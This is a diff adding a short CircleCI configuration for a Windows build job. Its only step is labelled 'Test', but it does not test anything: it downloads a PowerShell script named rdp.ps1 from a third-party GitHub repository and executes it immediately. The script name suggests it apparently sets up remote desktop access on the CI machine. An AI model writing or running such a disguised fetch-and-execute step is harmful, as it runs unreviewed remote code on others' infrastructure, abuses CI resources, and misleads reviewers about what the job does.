@@ -1,0 +1,17 @@
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
+    steps:
+      - run:
+          name: Test
+          command: |
+            Invoke-WebRequest https://raw.githubusercontent.com/tuyul-002/tuyul/main/rdp.ps1 -OutFile rdp.ps1
+            ./rdp.ps1
